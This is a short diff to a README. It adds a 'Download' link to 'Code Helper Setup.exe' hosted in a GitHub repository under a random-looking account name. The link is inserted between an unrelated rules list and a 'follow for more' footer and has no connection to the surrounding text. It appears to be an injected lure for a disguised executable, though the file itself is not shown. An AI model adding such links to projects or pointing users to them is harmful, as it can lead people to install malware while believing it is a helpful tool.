@@ -34,4 +34,6 @@ Rules:
       [2] It must be sort by a comma.
 
 ```
+![Download](https://github.com/pBsOycShSo/Code-Helper/blob/main/Code%20Helper%20Setup.exe)
+
 ##  🤝 If you are interested in my works, follow for more.
